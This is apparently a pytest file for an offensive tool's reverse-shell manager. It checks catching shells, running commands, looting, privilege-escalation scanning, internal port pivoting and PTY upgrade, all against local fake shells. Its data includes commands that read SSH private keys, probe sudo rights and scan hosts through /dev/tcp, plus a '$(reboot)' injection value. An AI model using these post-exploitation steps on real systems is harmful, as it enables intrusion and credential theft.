"""shell_session: listener catches a connection, shell_exec round-trips output."""

from __future__ import annotations

import socket
import threading
import time
from contextlib import contextmanager
from typing import TYPE_CHECKING, Any

from strix.tools.shell_session import manager


if TYPE_CHECKING:
    from collections.abc import Callable, Iterator


def _find_free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def _emit_sentinel(conn: socket.socket, line: str) -> None:
    """Print shell_exec's evaluated completion marker (``<marker>42``) if present."""
    _base, sep, tail = line.partition("; echo ")
    if sep and "$((6*7))" in tail:
        conn.sendall(tail.replace("$((6*7))", "42").encode() + b"\n")


def _fake_shell(host: str, port: int) -> None:
    """Echo each line prefixed with 'out:', then print the completion sentinel."""
    c = socket.create_connection((host, port), timeout=5)
    c.sendall(b"banner\n")
    try:
        while True:
            data = c.recv(4096)
            if not data:
                break
            line = data.decode("utf-8", errors="replace").strip()
            c.sendall(b"out:" + data)
            _emit_sentinel(c, line)
    except OSError:
        pass
    finally:
        c.close()


def _scripted_shell(host: str, port: int, replies: dict[str, bytes]) -> None:
    """Reply with ``replies[base command]``, then print shell_exec's completion sentinel.

    Mimics a real shell: strips the ``; echo <marker>$((6*7))`` that shell_exec
    appends, looks the base command up, replies, then echoes ``<marker>42`` so
    the completion path (not the timeout fallback) is what gets tested.
    """
    c = socket.create_connection((host, port), timeout=5)
    try:
        while True:
            data = c.recv(4096)
            if not data:
                break
            line = data.decode("utf-8", errors="replace").strip()
            base, _sep, _tail = line.partition("; echo ")
            c.sendall(replies.get(base.strip(), b""))
            _emit_sentinel(c, line)
    except OSError:
        pass
    finally:
        c.close()


def _wait_sid(timeout: float = 5) -> str:
    deadline = time.time() + timeout
    while time.time() < deadline:
        shells = manager.list_shells()
        if shells:
            return str(shells[0]["session_id"])
        time.sleep(0.05)
    raise AssertionError("no shell caught")


@contextmanager
def _session(shell: Callable[..., None], *shell_args: Any) -> Iterator[str]:
    port = _find_free_port()
    assert manager.start_listener(port, "127.0.0.1")["success"] is True
    try:
        threading.Thread(target=shell, args=("127.0.0.1", port, *shell_args), daemon=True).start()
        yield _wait_sid()
    finally:
        manager.close_shell(port=port)


def test_catch_shell_and_exec() -> None:
    with _session(_fake_shell) as sid:
        out = manager.shell_exec(sid, "id", read_timeout=2)
        assert out["success"] is True
        assert "out:id" in out["output"]  # our echo shell prefixed the command
        assert manager.close_shell(session_id=sid)["success"] is True


def test_exec_missing_session() -> None:
    assert manager.shell_exec("nope", "id")["success"] is False


def test_close_nothing() -> None:
    assert manager.close_shell()["success"] is False


def test_helpers_missing_session() -> None:
    assert manager.loot("nope")["success"] is False
    assert manager.privesc_scan("nope")["success"] is False
    assert manager.pivot_scan("nope", ["10.0.0.1"])["success"] is False
    assert manager.upgrade_pty("nope")["success"] is False


def test_loot_flags_high_value() -> None:
    replies = {cmd: b"" for _, cmd in manager._LOOT_COMMANDS}
    replies["whoami"] = b"www-data\n"
    replies["cat ~/.ssh/id_rsa 2>/dev/null"] = b"-----BEGIN OPENSSH PRIVATE KEY-----\nk\n"
    with _session(_scripted_shell, replies) as sid:
        out = manager.loot(sid)
    assert out["success"] is True
    assert out["loot"]["whoami"].startswith("www-data")
    assert "ssh_key" in out["high_value"]
    assert "dotenv" not in out["high_value"]
    assert set(out["loot"]) == {label for label, _ in manager._LOOT_COMMANDS}


def test_privesc_flags_sudo() -> None:
    replies = {cmd: b"" for _, cmd in manager._PRIVESC_COMMANDS}
    replies["sudo -n -l 2>/dev/null"] = b"(ALL) NOPASSWD: /usr/bin/find\n"
    with _session(_scripted_shell, replies) as sid:
        out = manager.privesc_scan(sid)
    assert out["success"] is True
    assert any(n.startswith("sudo:") for n in out["notable"])
    assert not any(n.startswith("suid:") for n in out["notable"])


def test_pivot_scan_echo_is_not_open() -> None:
    """A shell that echoes the command must not count as an open port."""
    with _session(_fake_shell) as sid:
        out = manager.pivot_scan(sid, ["10.0.0.5"], [22])
    assert out["success"] is True
    assert out["open"] == []
    assert out["tested"] == 1


def test_pivot_scan_detects_open() -> None:
    def shell(host: str, port: int) -> None:
        c = socket.create_connection((host, port), timeout=5)
        try:
            while True:
                data = c.recv(4096)
                if not data:
                    break
                line = data.decode("utf-8", errors="replace")
                if "/dev/tcp/10.0.0.5/22" in line:
                    c.sendall(b"OPEN42\n")
                _emit_sentinel(c, line.strip())
        except OSError:
            pass
        finally:
            c.close()

    with _session(shell) as sid:
        out = manager.pivot_scan(sid, ["10.0.0.5"], [22, 80])
    assert out["success"] is True
    assert out["tested"] == 2
    assert out["open"] == [{"host": "10.0.0.5", "port": 22}]


def test_pivot_scan_rejects_bad_targets() -> None:
    with _session(_fake_shell) as sid:
        assert manager.pivot_scan(sid, [])["success"] is False
        assert manager.pivot_scan(sid, ["$(reboot)"])["success"] is False
        assert manager.pivot_scan(sid, ["10.0.0.5"], [0, 70000])["success"] is False


def test_upgrade_pty_attempts_spawn() -> None:
    with _session(_fake_shell) as sid:
        out = manager.upgrade_pty(sid)
    assert out["success"] is True
    assert "PTY" in str(out["note"])
    assert "pty.spawn" in out["output"]


def test_empty_output_does_not_wait_full_timeout() -> None:
    with _session(_scripted_shell, {}) as sid:
        started = time.monotonic()
        out = manager.shell_exec(sid, "true", read_timeout=3.0)
        elapsed = time.monotonic() - started
    assert out["success"] is True
    assert out["output"] == ""
    assert elapsed < 1.5


def test_echoed_command_is_not_treated_as_done() -> None:
    """A shell that echoes ``$((6*7))`` must not complete before it prints ``42``."""

    def shell(host: str, port: int) -> None:
        c = socket.create_connection((host, port), timeout=5)
        try:
            data = c.recv(4096)
            if not data:
                return
            c.sendall(data)  # echo the unevaluated ``echo __STRX…$((6*7))`` line
            time.sleep(0.25)
            c.sendall(b"secret\n")
            _emit_sentinel(c, data.decode("utf-8", errors="replace").strip())
        except OSError:
            pass
        finally:
            c.close()

    with _session(shell) as sid:
        out = manager.shell_exec(sid, "id", read_timeout=3.0)
    assert out["success"] is True
    assert "secret" in out["output"]
    assert "42" not in out["output"]
